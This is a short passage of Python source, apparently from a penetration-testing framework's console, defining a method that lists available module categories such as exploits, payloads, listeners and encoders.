		print_info()

	def _show_all(self, *args, **kwargs):
		self._show_exploits()
		self._show_auxiliary()
		self._show_post()
		self._show_browser_exploits()
		self._show_browser_auxiliary()
		self._show_listeners()
		self._show_backdoors()
		self._show_payloads()
		self._show_encoders()
		self._show_bots()

	
